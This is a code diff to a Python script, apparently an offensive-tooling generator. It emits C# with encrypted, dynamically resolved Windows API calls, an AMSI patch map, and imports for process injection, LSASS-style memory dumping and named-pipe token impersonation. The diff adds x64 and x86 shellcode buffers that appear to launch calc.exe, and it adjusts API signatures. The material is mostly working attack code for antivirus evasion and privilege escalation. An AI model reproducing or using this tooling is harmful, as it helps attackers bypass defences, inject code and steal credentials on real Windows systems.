@@ -185,7 +185,7 @@ class Encryptor:
             #method_parts = method_signature.split(' ')
             
             # Parse variables
-            data_type = method_signature.split(" ")[2]
+            data_type = method_signature.split(" ")[3]
             api_name = method_signature.split(" ")[4].split("(")[0]
             parameters = method_signature.split("(")[1].split(")")[0]
             dll_name = attributes_line.split('"')[1]
@@ -193,9 +193,9 @@ class Encryptor:
 
             # Generate C# code
             delegate_code = (
-                f"\\\\\\\\ import {api_name.upper()}\n"
+                f"//// import {api_name.upper()}\n"
                 f"public delegate {data_type} p{api_name}({parameters});\n"
-                f"public static p{api_name} {api_name} = (p{api_name})Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle(\"{dll_name}\"), DecryptBytesToStringAes({api_name}_Bytes, AesKey)), typeof(p{api_name}));\n\n"
+                f"public static p{api_name} {api_name} = (p{api_name})Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle(\"{dll_name}\"), DecryptBytesToStringAes({api_name}_Bytes, AesKey)), typeof(p{api_name}));\n"
             )
             print(delegate_code)
 
@@ -205,9 +205,49 @@ class Encryptor:
 
 # paste x64 buf here
 buf =  b""
+buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
+buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
+buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
+buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
+buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
+buf += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
+buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
+buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
+buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
+buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
+buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
+buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
+buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+buf += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
+buf += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
+buf += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
+buf += b"\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
+buf += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
+buf += b"\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
 
 # paste x86 buf here as buf86
 buf86 =  b""
+buf86 += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
+buf86 += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
+buf86 += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
+buf86 += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
+buf86 += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+buf86 += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
+buf86 += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
+buf86 += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
+buf86 += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
+buf86 += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+buf86 += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
+buf86 += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00"
+buf86 += b"\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
+buf86 += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
+buf86 += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
+buf86 += b"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65"
+buf86 += b"\x00"
 
 # amsi patches dictionary
 AMSI_PATCH_MAP = {
@@ -237,23 +277,19 @@ API_NAMES = [
     "MiniDumpWriteDump",
     "amsi.dll",
     "NtTraceEvent",
-    "CreateNamedPipe",
+    "CreateNamedPipeW",
     "ConnectNamedPipe",
     "ImpersonateNamedPipeClient",
     "GetCurrentThread",
     "OpenThreadToken",
     "GetTokenInformation",
-    "ConvertSidToStringSid",
+    "ConvertSidToStringSidW",
     "DuplicateTokenEx",
     "CreateProcessWithTokenW"
 ]
-API_NAME_MAP = {api: api.encode() for api in API_NAMES}
+API_NAME_MAP = {api: api.encode() for api in sorted(API_NAMES)}
 
 pinvoke_signatures = [
-    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);''',
-    '''[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);''',
     '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
     '''[DllImport("kernel32.dll")]
@@ -261,7 +297,7 @@ pinvoke_signatures = [
     '''[DllImport("kernel32.dll")]
     public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);''',
     '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    public static extern IntPtr OpenProcess(uint processAccess, int bInheritHandle, int processId);''',
+    public static extern IntPtr OpenProcess(uint processAccess, int bInheritHandle, UInt32 processId);''',
     '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
     '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
@@ -281,7 +317,7 @@ pinvoke_signatures = [
     '''[DllImport("kernel32.dll")]
     public static extern IntPtr GetCurrentProcess();''',
     '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    public static extern IntPtr FlsAlloc(IntPtr callback);''',
+    public static extern IntPtr FlsAlloc(IntPtr lpCallback);''',
     '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     public static extern IntPtr LoadLibraryA(string name);''',
     '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
@@ -289,10 +325,10 @@ pinvoke_signatures = [
     '''[DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr GetStdHandle(int nStdHandle);''',
     '''[DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);''',
+    public static extern IntPtr CreateNamedPipeW(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);''',
     '''[DllImport("kernel32.dll")]
     public static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);''',
-    '''[DllImport("Advapi32.dll")]
+    '''[DllImport("advapi32.dll")]
     public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);''',
     '''[DllImport("kernel32.dll")]
     public static extern IntPtr GetCurrentThread();''',
@@ -300,13 +336,14 @@ pinvoke_signatures = [
     public static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);''',
     '''[DllImport("advapi32.dll", SetLastError = true)]
     public static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);''',
-    '''[DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
-    public static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);''',
+    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool ConvertSidToStringSidW(IntPtr pSID, out IntPtr ptrSid);''',
     '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);''',
-    '''[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+    '''[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);'''
 ]
+pinvoke_signatures = sorted(pinvoke_signatures)
 
 # ------------------
 # Main Function
